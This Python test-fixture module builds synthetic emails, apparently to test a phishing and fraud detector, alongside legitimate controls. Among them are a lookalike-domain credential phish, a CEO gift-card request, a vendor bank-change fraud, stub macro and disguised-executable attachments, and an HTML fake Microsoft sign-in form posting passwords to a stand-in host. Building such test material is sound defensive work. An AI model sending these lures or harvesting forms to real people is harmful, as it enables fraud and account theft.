"""Realistic test messages (synthetic; all domains are examples)."""

import io
import zipfile
from email.message import EmailMessage

M365_PASS = ("spf=pass (sender IP is 40.107.1.1) smtp.mailfrom={d}; dkim=pass (signature was verified) "
             "header.d={d};dmarc=pass action=none header.from={d};compauth=pass reason=100")
M365_FAIL = ("spf=fail (sender IP is 203.0.113.9) smtp.mailfrom={d}; dkim=none (message not signed) "
             "header.d=none;dmarc=fail action=quarantine header.from={d};compauth=fail reason=000")


def build(sender, subject, text=None, html=None, display="", reply_to=None, auth=None, to="ama.owusu@abelzeta.com",
          attachments=(), msgid="<test@example>"):
    m = EmailMessage()
    m["From"] = f"{display} <{sender}>" if display else sender
    m["To"] = to
    m["Subject"] = subject
    m["Message-ID"] = msgid
    m["Date"] = "Wed, 11 Nov 2026 09:00:00 +0000"
    if reply_to:
        m["Reply-To"] = reply_to
    if auth:
        m["Authentication-Results"] = auth.format(d=sender.split("@")[1])
    m.set_content(text or "See HTML version.")
    if html:
        m.add_alternative(html, subtype="html")
    for name, ctype, data in attachments:
        maintype, subtype = ctype.split("/")
        m.add_attachment(data, maintype=maintype, subtype=subtype, filename=name)
    return m.as_bytes()


def macro_docm() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document>Enable content to view the invoice</w:document>")
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0 Attribute VB_Name AutoOpen Shell powershell")
    return buf.getvalue()


def zip_with_exe() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("Invoice_2026.pdf.exe", b"MZ\x90\x00 fake executable")
    return buf.getvalue()


NEWSLETTER = build(
    "news@microsoft.com", "Your November product update", display="Microsoft",
    text="Here is what's new in Microsoft 365 this month. Read more at https://www.microsoft.com/microsoft-365/blog",
    html='<p>Here is what is new this month.</p><a href="https://www.microsoft.com/microsoft-365/blog">Read the blog</a>',
    auth=M365_PASS, msgid="<news-1@microsoft.com>")

CREDENTIAL_PHISH = build(
    "no-reply@rnicrosoft.com", "Action required: your mailbox will be suspended", display="Microsoft 365",
    text="Your mailbox will be suspended within 24 hours. Verify your account immediately.",
    html=('<p>Unusual sign-in detected. Your mailbox will be suspended within 24 hours.</p>'
          '<a href="http://micros0ft-login.xyz/office365/verify?u=ama">https://login.microsoftonline.com</a>'),
    auth=M365_FAIL, msgid="<phish-1@rnicrosoft.com>")

CEO_GIFT_CARDS = build(
    "john.mensah.ceo@gmail.com", "Quick favour", display="John Mensah",
    text=("Are you at your desk? I'm in a meeting and can't talk. I need you to buy 5 Apple gift cards for a "
          "client today, keep this between us. Send me the codes by email. John"),
    msgid="<bec-1@gmail.com>")

VENDOR_BANK_CHANGE = build(
    "accounts@globalsupplies-ltd.com", "Updated remittance details", display="Global Supplies Accounts",
    reply_to="globalsupplies.accounts@outlook.com",
    text=("Dear customer, please note our bank details have changed. Kindly update the vendor bank information "
          "and process the outstanding invoice INV-2291 urgently to our new account. IBAN GB00 0000 0000 0000."),
    msgid="<bec-2@globalsupplies-ltd.com>")

MACRO_MALWARE = build(
    "billing@freight-partners.example", "Invoice 88213 overdue", display="Freight Partners",
    text="Please find attached the overdue invoice. Enable content to view.",
    attachments=[("Invoice_88213.docm", "application/vnd.ms-word.document.macroEnabled.12", macro_docm())],
    msgid="<mal-1@freight-partners.example>")

ZIPPED_EXE = build(
    "scan@copier-office.example", "Scanned document", text="Your scanned document is attached.",
    attachments=[("scan_0042.zip", "application/zip", zip_with_exe())], msgid="<mal-2@copier-office.example>")

HTML_ATTACHMENT_PHISH = build(
    "docs@sharefile-secure.example", "Shared document: Q4 statement", text="Open the attached statement to view.",
    attachments=[("Statement.html", "text/html", (
        b"<html><head><title>Microsoft Sign in</title></head><body><form action='https://collect.example/p'>"
        b"<input name=email><input type=password name=pw></form><script>eval(atob('YWxlcnQoMSk='))</script>"
        b"</body></html>"))], msgid="<phish-2@sharefile-secure.example>")

INTERNAL_SPOOF = build(
    "ceo@abelzeta.com", "Payment needed today", display="CEO",
    text="Process a wire transfer of $48,000 today. Do not discuss with anyone.", auth=M365_FAIL,
    msgid="<spoof-1@abelzeta.com>")

INTERNAL_OK = build(
    "it@abelzeta.com", "Maintenance window Saturday", display="IT Team",
    text="Systems will be down for maintenance on Saturday 10:00-12:00.", auth=M365_PASS, msgid="<int-1@abelzeta.com>")

ALL = {
    "newsletter": NEWSLETTER, "credential_phish": CREDENTIAL_PHISH, "ceo_gift_cards": CEO_GIFT_CARDS,
    "vendor_bank_change": VENDOR_BANK_CHANGE, "macro_malware": MACRO_MALWARE, "zipped_exe": ZIPPED_EXE,
    "html_attachment_phish": HTML_ATTACHMENT_PHISH, "internal_spoof": INTERNAL_SPOOF, "internal_ok": INTERNAL_OK,
}
